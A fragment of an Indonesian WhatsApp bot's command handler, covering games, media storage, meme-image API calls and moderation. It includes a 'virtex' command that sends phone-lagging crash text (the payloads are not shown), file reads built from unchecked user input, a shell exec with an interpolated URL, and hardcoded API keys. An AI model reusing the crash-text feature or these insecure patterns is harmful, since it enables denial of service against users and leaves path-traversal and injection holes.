      case "setcmd":
        if (isBanned) return reply(mess.ban)
        if (isQuotedSticker) {
          if (!q)
            return reply(`Penggunaan : ${command} cmdnya dan tag stickernya`);
          var kodenya =
            mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString(
              "base64"
            );
          addCmd(kodenya, q);
          reply("Done!");
        } else {
          reply("tag stickenya");
        }
        break;
      case "delcmd":
        if (isBanned) return reply(mess.ban)
        if (!isQuotedSticker)
          return reply(`Penggunaan : ${command} tagsticker`);
        var kodenya =
          mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString(
            "base64"
          );
        _scommand.splice(getCommandPosition(kodenya), 1);
        fs.writeFileSync("./database/scommand.json", JSON.stringify(_scommand));
        reply("Done!");
        break;
      case "listcmd":
        teksnyee = `\`\`\`ã€Œ LIST STICKER CMD ã€\`\`\``;
        cemde = [];
        for (let i of _scommand) {
          cemde.push(i.id);
          teksnyee += `\n\nâž¸ *ID :* ${i.id}\nâž¸ *Cmd* : ${i.chats}`;
        }
        mentions(teksnyee, cemde, true);
        break;
      //------------------< Fitur Fun >-------------------
      //funmenu
                case "bisakah":
                  if (isBanned) return reply(mess.ban)
					// âš ï¸ Case by DappaUhuy&YogPw

              
					bisakah = body.slice(1)
					const bisa =['Bisa','Tidak Bisa','Hmmm gimana ya','Gak bisa ajg awoakwok','mana mungkin su','Bisa banget tuh, keren kayaknya']
					const keh = bisa[Math.floor(Math.random() * bisa.length)]
					syaa.sendMessage(from, 'Pertanyaan : *'+bisakah+'*\n\nJawaban : '+ keh, text, { quoted: mek })
					await limitAdd(sender)
					break
		            case "kapankah":
		              if (isBanned) return reply(mess.ban)
					// âš ï¸ Case by DappaUhuy&YogPw

                
					kapankah = body.slice(1)
					const kapan =['Besok','Lusa','1 Hari Lagi','2 Hari Lagi','3 Hari Lagi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','7 Bulan Lagi','8 Bulan Lagi','9 Bulan Lagi','10 Bulan Lagi','11 Bulan Lagi','1 Tahun lagi','2 Tahun lagi','3 Tahun lag0i','4 Tahun lagi','5 Tahun lagi','6 Tahun lagi','7 Tahun lagi','8 Tahun lagi','9 Tahun lagi','10 Tahun lagi']
					const koh = kapan[Math.floor(Math.random() * kapan.length)]
					syaa.sendMessage(from, 'Pertanyaan : *'+kapankah+'*\n\nJawaban : '+ koh, text, { quoted: mek })
					await limitAdd(sender)
					break
		            case "apakah":
		              if (isBanned) return reply(mess.ban)
					// âš ï¸ Case by DappaUhuy&YogPw

                 
					apakah = body.slice(1)
					const apa =['Iya','Tidak','Bisa Jadi','Hmmm gimana ya']
					const kah = apa[Math.floor(Math.random() * apa.length)]
					syaa.sendMessage(from, 'Pertanyaan : *'+apakah+'*\n\nJawaban : '+ kah, text, { quoted: mek })
					await limitAdd(sender)
					break
case "belah":
  if (isBanned) return reply(mess.ban)
					// âš ï¸ Case by Arasya
                 
				if (args.length < 1) return reply('mana pertanyaan nya kak?\nContoh #iyas bermain Free Fire')
					iyas = body.slice(7)
					const iya =['Bener','Salah','Bener dong','Salah!!!']
					const salah = iya[Math.floor(Math.random() * iya.length)]
					syaa.sendMessage(from, 'Pertanyaan : *bener atau salah '+iyas+'*\n\nJawaban : '+ salah, text, { quoted: mek })
					await limitAdd(sender)
					break
		            case "bagaimanakah":
		              if (isBanned) return reply(mess.ban)
					// âš ï¸ Case by DappaUhuy&YogPw

                 
					bagaimanakah = body.slice(1)
					const bagai =['Kita Kenal?','Nanya Terus deh','Tidak Tahu','Hmmm gimana ya','Cari Aja Sendiri','Kurang Tahu','Mana Saya Tahu, Saya kan ikan']
					const mana = bagai[Math.floor(Math.random() * bagai.length)]
					syaa.sendMessage(from, 'Pertanyaan : *'+bagaimanakah+'*\n\nJawaban : '+ mana, text, { quoted: mek })
					await limitAdd(sender)
					break
		            case "rate":
		              if (isBanned) return reply(mess.ban)
					// âš ï¸ Case by DappaUhuy&YogPw

                 
					rate = body.slice(1)
					const ra =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const te = ra[Math.floor(Math.random() * ra.length)]
					syaa.sendMessage(from, 'Pertanyaan : *'+rate+'*\n\nJawaban : '+ te+'%', text, { quoted: mek })
					await limitAdd(sender)
					break
                    case "sangecek":
					// âš ï¸ Case by DappaUhuy&YogPw
if (isBanned) return reply(mess.ban)
                 
					sange = body.slice(1)
					const sang =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const nge = sang[Math.floor(Math.random() * sang.length)]
					syaa.sendMessage(from, 'Pertanyaan : *'+sange+'*\n\nJawaban : '+ nge+'%', text, { quoted: mek })
					await limitAdd(sender)
					break
case "gaycek":
  if (isBanned) return reply(mess.ban)
					// âš ï¸ Case by DappaUhuy&YogPw

              
					gayy = body.slice(1)
					const gay =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const yag = gay[Math.floor(Math.random() * gay.length)]
					syaa.sendMessage(from, 'Pertanyaan : *'+gayy+'*\n\nJawaban : '+ yag+'%', text, { quoted: mek })
					await limitAdd(sender)
					break
////Akhir
/////////===============///////////////////////////CASE STORAGE!!///////////////
case 'addvideo':
				//Fix By M4N1K
          
					if (!isQuotedVideo) return reply('Reply videonya blokk!')
					svst = body.slice(10)
					if (!svst) return reply('Nama videonya apa su?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await syaa.downloadMediaMessage(boij)
					videonye.push(`${svst}`)
					fs.writeFileSync(`./strg/video/${svst}.mp4`, delb)
					fs.writeFileSync('./strg/video.json', JSON.stringify(videonye))
					syaa.sendMessage(from, `Sukses Menambahkan Video\nCek dengan cara ${prefix}listvideo`, MessageType.text, { quoted: mek })
					break
					
				case 'getvideo':
				//Fix By M4N1K
					namastc = body.slice(10)
					buffer = fs.readFileSync(`./strg/video/${namastc}.mp4`)
					syaa.sendMessage(from, buffer, video, { mimetype: 'video/mp4', quoted: mek })
					break
					
				case 'listvideo':
				case 'videolist':
				//Fix By M4N1K
					teks = '*List Video :*\n\n'
					for (let awokwkwk of videonye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${videonye.length}*`
					syaa.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": videonye } })
					break
case 'getsticker':
				case 'gets': 
				  
					namastc = body.slice(12)
					result = fs.readFileSync(`./strg/stiker/${namastc}.webp`)
					syaa.sendMessage(from, result, sticker, {quoted :mek})
					break
                case 'stickerlist':
				case 'liststicker': 
				  
					teks = '*Sticker List :*\n\n'
					for (let awokwkwk of setiker) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${setiker.length}*`
					syaa.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": setiker } })
					break
                case 'addsticker':
                case 'addstiker':
				
					if (!isQuotedSticker) return reply('Reply stiker nya')
					svst = body.slice(12)
					if (!svst) return reply('Nama sticker nya apa?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await syaa.downloadMediaMessage(boij)
					setiker.push(`${svst}`)
					fs.writeFileSync(`./strg/stiker/${svst}.webp`, delb)
					fs.writeFileSync(`./strg/stik.json`, JSON.stringify(setiker))
					syaa.sendMessage(from, `Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststicker`, MessageType.text, { quoted: mek })
					break
case 'addupdate': 
					svst = body.slice(11)
					if (!svst) return reply('Nama fiturnya apa su?')
					
					fs.writeFileSync('./database/video.json', JSON.stringify(fiturnye))
					syaa.sendMessage(from, `Sukses Menambahkan Fitur, cek di /listfitur`, MessageType.text, { quoted: mek })
					break
case 'listfitur':
				case 'fiturlist': 
				
					teks = '*List Fitur:*\n\n'
					for (let awokwkwk of fiturnye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${fiturnye.length}*`
					syaa.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": fiturnye } })
					break
case 'addvn': 
  if (!svst) return reply('Nama audionya apa su?')
					svst = body.slice(7)
					if (!svst) return reply('Nama audionya apa su?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await syaa.downloadMediaMessage(boij)
					audionye.push(`${svst}`)
					fs.writeFileSync(`./strg/audio/${svst}.mp3`, delb)
					fs.writeFileSync('./strg/audio.json', JSON.stringify(audionye))
					syaa.sendMessage(from, `Sukses Menambahkan Video\nCek dengan cara ${prefix}listvn`, MessageType.text, { quoted: mek })
					break
			
				case 'listvn':
				case 'vnlist': 
				
					teks = '*List Vn:*\n\n'
					for (let awokwkwk of audionye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${audionye.length}*`
					syaa.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": audionye } })
					break
case 'getvn': 
          
					namastc = body.slice(7)
					buffer = fs.readFileSync(`./strg/audio/${namastc}.mp3`)
					syaa.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: mek, ptt: true })
					break
case 'addimage':
				//Fix By M4N1K
          
					if (!isQuotedImage) return reply('Reply imagenya blokk!')
					svst = body.slice(10)
					if (!svst) return reply('Nama imagenya apa su?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await syaa.downloadMediaMessage(boij)
					imagenye.push(`${svst}`)
					fs.writeFileSync(`./strg/image/${svst}.jpeg`, delb)
					fs.writeFileSync('./strg/image.json', JSON.stringify(imagenye))
					syaa.sendMessage(from, `Sukses Menambahkan Video\nCek dengan cara ${prefix}listimage`, MessageType.text, { quoted: mek })
					break
					
				case 'getimage':
				//Fix By M4N1K
					namastc = body.slice(10)
					buffer = fs.readFileSync(`./strg/image/${namastc}.jpeg`)
					syaa.sendMessage(from, buffer, image, { quoted: mek, caption: `Result From Database : ${namastc}.jpeg` })
					break
					
				case 'imglist':
				case 'listimg':
				//Fix By M4N1K
					teks = '*List Image :*\n\n'
					for (let awokwkwk of imagenye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${imagenye.length}*`
					syaa.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": imagenye } })
					break
////atm&limit
case "limit":
				// Fix Case By Yogi/Hansâ›”
                 
				checkLimit(sender)
				break
             
////slot2 by manik
case 'slot':
            case 'slots':
              if (isBanned) return reply(mess.ban)
            const somtoy = sotoy[Math.floor(Math.random() * sotoy.length)]
            syaa.sendMessage(from, `[  ðŸŽ° | SLOTS ]\n-----------------\nðŸ‹ : ðŸŒ : ðŸ\n${somtoy} <=====||\nðŸ‹ : ðŸŒ : ðŸ\n[  ðŸŽ° | SLOTS ]\n\nKeterangan : Jika anda Mendapatkan 3Buah Sama Berarti Anda Menang\n\nContoh : ðŸŒ : ðŸŒ : ðŸŒ<=====`, MessageType.text, { quoted: mek })
            sendButMessage(from, `Mau main lagi?`, `Pencet tombol di bawah`, [
          {
            buttonId: `${prefix}slot`,
            buttonText: {
              displayText: `Play Again`,
            },
            type: 1,
          },
        ]);
            break;
///////Slot
/*TEST TOD NYA WISNUUUUU GES*/
case "tod":
  if (isBanned) return reply(mess.ban)
					 var arasyagans =` ${pushname} mau yg truth or dare?\n\npilih tombol di bawah `
					sendButImage(from, arasyagans, "Case By @iamghosky_", thumb, [
          {
            buttonId: `${prefix}truth`,
            buttonText: {
              displayText: `Truth`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}dare`,
            buttonText: {
              displayText: `Dare`
            },
            type: 1,
          },
 ]);
 break
/*TEST COMMAND*/
///////////////////////////////A================\\\\\\\\\\\\aAKHR
case 'citacita':
  if (isBanned) return reply(mess.ban)
              const cita =['http://piyobot.000webhostapp.com/citacita1.mp3','http://piyobot.000webhostapp.com/citacita2.mp3','http://piyobot.000webhostapp.com/citacita3.mp3','http://piyobot.000webhostapp.com/citacita4.mp3','http://piyobot.000webhostapp.com/citacita5.mp3','http://piyobot.000webhostapp.com/citacita6.mp3','http://piyobot.000webhostapp.com/citacita7.mp3','http://piyobot.000webhostapp.com/citacita8.mp3','http://piyobot.000webhostapp.com/citacita9.mp3','http://piyobot.000webhostapp.com/citacita10.mp3','http://piyobot.000webhostapp.com/citacita11.mp3','http://piyobot.000webhostapp.com/citacita12.mp3','http://piyobot.000webhostapp.com/citacita13.mp3','http://piyobot.000webhostapp.com/citacita14.mp3','http://piyobot.000webhostapp.com/citacita15.mp3','http://piyobot.000webhostapp.com/citacita16.mp3','http://piyobot.000webhostapp.com/citacita17.mp3','http://piyobot.000webhostapp.com/citacita18.mp3','http://piyobot.000webhostapp.com/citacita19.mp3','http://piyobot.000webhostapp.com/citacita20.mp3','http://piyobot.000webhostapp.com/citacita21.mp3','http://piyobot.000webhostapp.com/citacita22.mp3','http://piyobot.000webhostapp.com/citacita23.mp3','http://piyobot.000webhostapp.com/citacita24.mp3','http://piyobot.000webhostapp.com/citacita25.mp3','http://piyobot.000webhostapp.com/citacita26.mp3','http://piyobot.000webhostapp.com/citacita27.mp3','http://piyobot.000webhostapp.com/citacita28.mp3','http://piyobot.000webhostapp.com/citacita29.mp3','http://piyobot.000webhostapp.com/citacita30.mp3','http://piyobot.000webhostapp.com/citacita31.mp3','http://piyobot.000webhostapp.com/citacita32.mp3','http://piyobot.000webhostapp.com/citacita33.mp3','http://piyobot.000webhostapp.com/citacita34.mp3','http://piyobot.000webhostapp.com/citacita35.mp3']

              const cita3 = cita[Math.floor(Math.random() * cita.length)]
              cita2 = await getBuffer(cita3)
              syaa.sendMessage(from, cita2, audio,{mimetype: 'audio/mp4', ptt:true, quoted: mek})
              break
///Case by rame
case 'shortlink':
				if (isBanned) return reply(mess.ban)
				syaa.updatePresence(from, Presence.composing) 
				urlnya = body.slice(11)
				data = await fetchJson(`https://hujanapi.herokuapp.com/api/cuttly?url=${args[0]}&apikey=trial2k21`)
				hasil = `link : ${args[0]}\n\nOutput : ${data.result.Short}`
				reply(hasil)
				await limitAdd(sender)
				break
case 'fftext': 				
				if (isBanned) return reply(mess.ban)
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}fftourserti DappaUhuy`)
				reply(mess.wait)
				ct = body.slice(8)
				dapuhy = await getBuffer(`https://hujanapi.herokuapp.com/api/fftext?text=${ct}&hero=Kelly&apikey=trial2k21`)
				syaa.sendMessage(from, dapuhy, image, { quoted: mek, caption: 'Nih Jangan Lupa Follow Ig rsyarfi_.04' })
				break
case 'kbbi':	
        if (isBanned) return reply(mess.wait)
				if (args.length < 1) return reply('Apa yang mau dicari di kbbi kak?')
				selepi = body.slice(6)
				anu = await fetchJson(`https://hardianto-chan.herokuapp.com/api/info/kbbi?kata=${selepi}&apikey=hardianto`, {method: 'get'})
				reply('Menurut Kbbi:\n\n'+anu.result.arti)
				break
case 'wiki': case 'wikipedia':
  if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(' Yang Mau Di Cari Apa? ')
reply(mess.wait)
teks = args.join(' ')
res = await wikiSearch(teks).catch(e => {
return reply('_Error Hasil Tidak Ditemukan_') 
}) 
result = `*JUDUL :* ${res[0].judul}

*WIKI :* ${res[0].wiki}`
sendMediaURL(res[0].thumb, image, {quoted: mek, caption: result}).catch(e => {
reply(result)
})
break
case 'spongebobm':
				if (isBanned) return reply(mess.ban)
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(mess.wait)
	  owgi = await syaa.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi)
	  hehe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/knights/spongebob?apikey=hardianto&pp=${anu.display_url}`)
	 syaa.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Foto Nya Mana Gan ðŸ—¿')
	}
	break
case 'hengkerm':
				if (isBanned) return reply(mess.ban)
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(mess.wait)
	  owgi = await syaa.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi)
	  hehe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/beta/hacker2?apikey=hardianto&pp=${anu.display_url}`)
	 syaa.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Foto Nya Mana Gan ðŸ—¿')
	}
	break
case 'hengkerm2':
				if (isBanned) return reply(mess.ban)
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(mess.wait)
	  owgi = await syaa.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi)
	  hehe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/beta/hacker3?apikey=hardianto&pp=${anu.display_url}`)
	 syaa.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Foto Nya Mana Gan ðŸ—¿')
	}
	break
case 'ripm':
				if (isBanned) return reply(mess.ban)
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(mess.wait)
	  owgi = await syaa.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi)
	  hehe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/rip?image=${anu.display_url}&apikey=hardianto`)
	 syaa.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Foto Nya Mana Gan ðŸ—¿')
	}
	break
case 'stonkm':
				if (isBanned) return reply(mess.ban)
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(mess.wait)
	  owgi = await syaa.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi)
	  hehe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/stonk?image=${anu.display_url}&apikey=hardianto`)
	 syaa.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Foto Nya Mana Gan ðŸ—¿')
	}
	break
case 'notstonkm':
				if (isBanned) return reply(mess.ban)
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(mess.wait)
	  owgi = await syaa.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi)
	  hehe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/not-stonk?image=${anu.display_url}&apikey=hardianto`)
	 syaa.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Foto Nya Mana Gan ðŸ—¿')
	}
	break
case 'patrickm':
				if (isBanned) return reply(mess.ban)
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(mess.wait)
	  owgi = await syaa.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi)
	  hehe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/knights/patrick?apikey=hardianto&pp=${anu.display_url}`)
	 syaa.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Foto Nya Mana Gan ðŸ—¿')
	}
	break
case 'ocr':
				if (isBanned) return reply(mess.wait)
				reply(mess.wait)
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await syaa.downloadAndSaveMediaMessage(encmedia)
						await recognize(media, {lang: 'eng+ind', oem: 1, psm: 3})
							.then(teks => {
								reply(teks.trim())
								fs.unlinkSync(media)
							})
							.catch(err => {
								reply(err.message)
								fs.unlinkSync(media)
							})
					} else {
						reply('Foto aja gan Jangan Video')
					}
					await limitAdd(sender) 
					break
case "suit":
  if (isBanned) return reply(mess.ban)
  sendButMessage(from, `Pilih Gunting Kertas Atau Batu`, `case By @k4t4sh1._`, [
          {
            buttonId: `${prefix}sutit batu`,
            buttonText: {
              displayText: `BATU`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}sutit gunting`,
            buttonText: {
              displayText: `GUNTING`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}sutit kertas`,
            buttonText: {
              displayText: `KERTAS`,
            },
            type: 1,
          },
        ]);
        break
case 'sutit':
  if (isBanned) return reply(mess.ban)
  if (args.length < 1) return reply('Pilih gunting/batu/kertas')
					if (args[0] === 'gunting' ) {
					  gunting = [
					    "Kamu *Gunting*\nAku *Kertas*\nKamu Menang ðŸ˜”",
					    "Kamu *Gunting*\nAku *Batu*\nKamu Kalah ðŸ™‚",
					    "Kamu *Gunting*\nAku *Gunting*\nKita Seri ðŸ˜"
					    ]
					  gun = gunting[Math.floor(Math.random() * gunting.length)]
					  reply(gun)
					} else if (args[0] === 'kertas') {
					  ker = [
					    "Kamu *Kertas*\nAku *Batu*\nKamu Menang ðŸ˜”",
					    "Kamu *Kertas*\nAku *Gunting*\nKamu Kalah ðŸ™‚",
					    "Kamu *Kertas*\nAku *Kertas*\nKita Seri ðŸ˜"
					    ]
					  kertas = ker[Math.floor(Math.random() * ker.length)]
						reply(kertas)
					} else if (args[0] === 'batu') {
					  bat = [
					    "Kamu *Batu*\nAku *Gunting*\nKamu Menang ??",
					    "Kamu *Batu*\nAku *Kertas*\nKamu Kalah ðŸ™‚",
					    "Kamu *Batu*\nAku *Batu*\nKita Seri ðŸ˜"
					    ]
					  batu = bat[Math.floor(Math.random() * bat.length)]
					  reply(batu)
					} else {
					  reply('Pilih gunting/batu/kertas')
					}
break
case "gay":
  if (isBanned) return reply(mess.ban)
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
  ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
  reply("Loading....")
  owgi = await syaa.downloadAndSaveMediaMessage(ger)
  anu = await imgbb("dc773cce66f3dcf3ab3bc83dc7bf3555", owgi)
  teks = `${anu.display_url}`
  ranp = getRandom('.gif')
  rano = getRandom('.webp')
  anu1 = `https://some-random-api.ml/canvas/gay?avatar=${teks}`
  exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (e) => {
fs.unlinkSync(ranp)
if (e) return reply('Hadeh Emror:V')
nobg = fs.readFileSync(rano)
syaa.sendMessage(from, nobg, sticker, {
  quoted: mek
})
fs.unlinkSync(rano)
  })

} else {
  reply('Gunakan foto!')
}
break

case 'readall':
              totalchat.map( async ({ jid }) => {
              await syaa.chatRead(jid)
})
              reply(`\`\`\`Berhasil membaca Seluruh Chat !\`\`\``)
              console.log(totalchat.length)
              break	
case 'wangy':
  if (isBanned) return reply(mess.ban)
              if (!q) return
              qq = q.toUpperCase()
              awikwok = `${qq} ${qq} ${qq} â¤ï¸ â¤ï¸ â¤ï¸ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis â¤ï¸ â¤ï¸ â¤ï¸ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH â¤ï¸ â¤ï¸ â¤ï¸apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. â¤ï¸ â¤ï¸ â¤ï¸ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah â¤ï¸ â¤ï¸ â¤ï¸ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
              reply(awikwok)
              break
 case "virtex":
   if (isBanned) return reply(mess.ban)
sendButMessage(from, `Virtex ini akan membuat hape kamu lagg,
Silahkan pilih, apakah kamu mau aku kirim virtex?`, `Virtex By @k4t4sh1._`, [
          {
            buttonId: `${prefix}svirtex`,
            buttonText: {
              displayText: `YA`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}dpwkdwk`,
            buttonText: {
              displayText: `TIDAK`,
            },
            type: 1,
          },
        ]);
       case "slebewbewbew":
         fakegroup(`Baiklah bot tidak akan kirim kamu virtex`)
			  break
case 'svirtex':
if (!isOwner && !mek.key.fromMe) return reply(mess.own)    
reply(`${ngazap(prefix)}`)
reply(`${emoji2(prefix)}`)
reply(`${virtex(prefix)}`)
reply(`${virtex2(prefix)}`)
reply(`${virtex3(prefix)}`)
reply(`${virtex4(prefix)}`)
reply(`${virtex5(prefix)}`)
reply(`${virtex6(prefix)}`)
reply(`${virtex7(prefix)}`)
reply(`${virtex8(prefix)}`)
reply(`${virtex9(prefix)}`)
reply(`${virtag(prefix)}`)
break
case "report":
          			
          				const kontil = body.slice(8)
                      if (kontil.length > 300) return syaa.sendMessage(from, 'Maaf Teks Terlalu Panjang, Maksimal 300 Teks', text, {quoted: mek})
                        var tonmor = mek.participant
                       const buseh = `*[BUG REPORT]*\nNomor : @${tonmor.split("@s.whatsapp.net")[0]}\nPesan : ${kontil}`

                      var options = {
                         text: buseh,
                         contextInfo: {mentionedJid: [tonmor]},
                     }
                    syaa.sendMessage('6289626029135@s.whatsapp.net', options, text, {quoted: mek})
                    reply('LAPORAN ANDA TELAH SAMPAI ke owner BOT, Laporan palsu/main2 tidak akan ditanggapi.')
                    break
case "say":
  if (isBanned) return reply(mess.ban)
              teks = body.slice(5)
              if (args.length < 1) return reply('teksnya mana kak?')
              saying = teks
                 syaa.sendMessage(from, saying, text)
              break
var c = '```'
/*case "tagall":
					if (!isGroup) return reply("Khusus di grup");
					if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.admin);
        if (!isBotGroupAdmins) return reply("Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Tersebut");
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '\n\n'
					for (let mem of groupMembers) {
						teks += ` *â†’*  @${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					mentions(teks, members_id, true)
					break*/
					case 'ban':
				if (!isPremium) return reply(mess.prem)
				bnnd = body.slice(5)
				ban.push(`${args[0].replace('@','')}@s.whatsapp.net`)
				fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
				reply(`Berhasil membanned nomor : wa.me/${bnnd} `)
				break
case 'unban':  
					
					if (!isPremium) return reply(mess.prem)
					delp = body.slice(7)
					ban.splice(`${delp}@s.whatsapp.net`, 1)
					fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
					reply(`Berhasil Menghapus wa.me/${delp} dari banned`)
